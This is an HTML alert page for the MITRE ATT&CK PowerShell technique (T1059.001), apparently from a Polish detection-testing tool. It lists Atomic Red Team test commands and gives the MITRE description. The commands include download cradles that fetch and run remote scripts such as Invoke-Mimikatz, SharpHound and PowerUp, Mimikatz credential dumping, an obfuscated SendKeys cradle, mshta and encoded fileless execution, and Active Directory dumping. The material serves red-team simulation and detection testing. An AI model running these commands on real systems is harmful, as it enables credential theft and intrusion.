<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <title>Alert: PowerShell</title>
  <style>
    body { font-family: Segoe UI, Arial, sans-serif; margin: 2rem; background: #f6f7fb; }
    .card { background: #fff; border-radius: 10px; box-shadow: 0 2px 6px #bbb; padding: 2rem; max-width: 700px; margin: auto; }
    h1 { margin-top: 0; font-size: 2rem; }
    .desc, .id, .link, .author, .tactic, .status { margin-bottom: 1.1em; }
    .meta { font-size: .95em; color: #555; margin-bottom: .8em; }
    .section { font-size: .99em; }
    .scenario-block { background: #f4f0d9; border-radius: 7px; padding: 1em 1.2em; margin-bottom: 1.2em; color:#4a4500; font-size:1.07em; border-left:5px solid #e1c553; }
    pre { background: #eee; padding: .7em 1em; border-radius: 5px; }
    code { background: #f6f6f6; padding: 2px 5px; border-radius: 2px; }
    ul { margin-left: 1.6em; }
  </style>
</head>
<body>
<div class="card">
  <h1>Alert: PowerShell</h1>
  <div class="meta"><b>Technique ID:</b> T1059.001<div style='background:#eaf4ff;border-radius:8px;padding:15px 16px;margin-top:25px;'><b>Atomic Red Team – dostępne testy dla tej techniki:</b><ul><li><b>Mimikatz</b><br><b>Polecenia testowe (cmd):</b><pre>powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"</pre><a href='../../scenarios/atomic_tests\T1059.001\Mimikatz/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Run BloodHound from local disk</b><br><b>Polecenia testowe (powershell):</b><pre>import-module "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
try { Invoke-BloodHound -OutputDirectory $env:Temp }
catch { $_; exit $_.Exception.HResult}
Start-Sleep 5</pre><a href='../../scenarios/atomic_tests\T1059.001\Run_BloodHound_from_local_disk/test_1.ps1'>Pobierz test_1.ps1</a><br><b>Polecenia cleanup (powershell):</b><pre>Remove-Item $env:Temp\*BloodHound.zip -Force</pre><a href='../../scenarios/atomic_tests\T1059.001\Run_BloodHound_from_local_disk/cleanup_1.ps1'>Pobierz cleanup_1.ps1</a><br></li><li><b>Run Bloodhound from Memory using Download Cradle</b><br><b>Polecenia testowe (powershell):</b><pre>write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5</pre><a href='../../scenarios/atomic_tests\T1059.001\Run_Bloodhound_from_Memory_using_Downloa/test_1.ps1'>Pobierz test_1.ps1</a><br><b>Polecenia cleanup (powershell):</b><pre>Remove-Item $env:Temp\*BloodHound.zip -Force</pre><a href='../../scenarios/atomic_tests\T1059.001\Run_Bloodhound_from_Memory_using_Downloa/cleanup_1.ps1'>Pobierz cleanup_1.ps1</a><br></li><li><b>Mimikatz - Cradlecraft PsSendKeys</b><br><b>Polecenia testowe (powershell):</b><pre>$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr</pre><a href='../../scenarios/atomic_tests\T1059.001\Mimikatz_-_Cradlecraft_PsSendKeys/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>Invoke-AppPathBypass</b><br><b>Polecenia testowe (cmd):</b><pre>Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"</pre><a href='../../scenarios/atomic_tests\T1059.001\Invoke-AppPathBypass/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Powershell MsXml COM object - with prompt</b><br><b>Polecenia testowe (cmd):</b><pre>powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"</pre><a href='../../scenarios/atomic_tests\T1059.001\Powershell_MsXml_COM_object_-_with_promp/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Powershell XML requests</b><br><b>Polecenia testowe (cmd):</b><pre>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"</pre><a href='../../scenarios/atomic_tests\T1059.001\Powershell_XML_requests/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Powershell invoke mshta.exe download</b><br><b>Polecenia testowe (cmd):</b><pre>C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"</pre><a href='../../scenarios/atomic_tests\T1059.001\Powershell_invoke_mshta.exe_download/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Powershell Invoke-DownloadCradle</b></li><li><b>PowerShell Fileless Script Execution</b><br><b>Polecenia testowe (powershell):</b><pre># Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" /f
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))</pre><a href='../../scenarios/atomic_tests\T1059.001\PowerShell_Fileless_Script_Execution/test_1.ps1'>Pobierz test_1.ps1</a><br><b>Polecenia cleanup (powershell):</b><pre>Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore</pre><a href='../../scenarios/atomic_tests\T1059.001\PowerShell_Fileless_Script_Execution/cleanup_1.ps1'>Pobierz cleanup_1.ps1</a><br></li><li><b>NTFS Alternate Data Stream Access</b><br><b>Polecenia testowe (powershell):</b><pre>Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
Invoke-Expression $streamcommand</pre><a href='../../scenarios/atomic_tests\T1059.001\NTFS_Alternate_Data_Stream_Access/test_1.ps1'>Pobierz test_1.ps1</a><br><b>Polecenia cleanup (powershell):</b><pre>Remove-Item #{ads_file} -Force -ErrorAction Ignore</pre><a href='../../scenarios/atomic_tests\T1059.001\NTFS_Alternate_Data_Stream_Access/cleanup_1.ps1'>Pobierz cleanup_1.ps1</a><br></li><li><b>PowerShell Session Creation and Use</b><br><b>Polecenia testowe (powershell):</b><pre>New-PSSession -ComputerName #{hostname_to_connect}
Test-Connection $env:COMPUTERNAME
Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use</pre><a href='../../scenarios/atomic_tests\T1059.001\PowerShell_Session_Creation_and_Use/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>ATHPowerShellCommandLineParameter -Command parameter variations</b><br><b>Polecenia testowe (powershell):</b><pre>Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop</pre><a href='../../scenarios/atomic_tests\T1059.001\ATHPowerShellCommandLineParameter_-Comma/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments</b><br><b>Polecenia testowe (powershell):</b><pre>Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop</pre><a href='../../scenarios/atomic_tests\T1059.001\ATHPowerShellCommandLineParameter_-Comma/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>ATHPowerShellCommandLineParameter -EncodedCommand parameter variations</b><br><b>Polecenia testowe (powershell):</b><pre>Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop</pre><a href='../../scenarios/atomic_tests\T1059.001\ATHPowerShellCommandLineParameter_-Encod/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments</b><br><b>Polecenia testowe (powershell):</b><pre>Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop</pre><a href='../../scenarios/atomic_tests\T1059.001\ATHPowerShellCommandLineParameter_-Encod/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>PowerShell Command Execution</b><br><b>Polecenia testowe (cmd):</b><pre>powershell.exe -e  #{obfuscated_code}</pre><a href='../../scenarios/atomic_tests\T1059.001\PowerShell_Command_Execution/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>PowerShell Invoke Known Malicious Cmdlets</b><br><b>Polecenia testowe (powershell):</b><pre>$malcmdlets = #{Malicious_cmdlets}
foreach ($cmdlets in $malcmdlets) {
    "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}
foreach ($cmdlets in $malcmdlets) {
    $cmdlets}</pre><a href='../../scenarios/atomic_tests\T1059.001\PowerShell_Invoke_Known_Malicious_Cmdlet/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>PowerUp Invoke-AllChecks</b><br><b>Polecenia testowe (powershell):</b><pre>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
Invoke-AllChecks</pre><a href='../../scenarios/atomic_tests\T1059.001\PowerUp_Invoke-AllChecks/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>Abuse Nslookup with DNS Records</b><br><b>Polecenia testowe (powershell):</b><pre># creating a custom nslookup function that will indeed call nslookup but forces the result to be "whoami"
# this would not be part of a real attack but helpful for this simulation
function nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")}
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]</pre><a href='../../scenarios/atomic_tests\T1059.001\Abuse_Nslookup_with_DNS_Records/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>SOAPHound - Dump BloodHound Data</b><br><b>Polecenia testowe (powershell):</b><pre>#{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}</pre><a href='../../scenarios/atomic_tests\T1059.001\SOAPHound_-_Dump_BloodHound_Data/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>SOAPHound - Build Cache</b><br><b>Polecenia testowe (powershell):</b><pre>#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}</pre><a href='../../scenarios/atomic_tests\T1059.001\SOAPHound_-_Build_Cache/test_1.ps1'>Pobierz test_1.ps1</a><br></li></ul><a href='https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1059.001' target='_blank'>Zobacz wszystkie testy na GitHubie</a></div></div>
  <div class="tactic section"><b>Tactics:</b> <a href="https://attack.mitre.org/tactics/TA0002/" target="_blank">Execution (TA0002)</a></div>
  <div class="status section"><b>Status:</b> Pending</div>
  <div class="scenario-block"><b>Twój opis scenariusza:</b><br>Opis scenariusza, podatności lub techniki.</div>
  <div class="desc section"><b>MITRE Description:</b><br>Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).  PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.  A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)  PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)</div>
  <div class="link section"><b>MITRE Link:</b> <a href="https://attack.mitre.org/techniques/T1059/001/" target="_blank">https://attack.mitre.org/techniques/T1059/001/</a></div>
  <div class="author section"><b>Author:</b> Krzysztof K.</div>
</div>
</body>
</html>
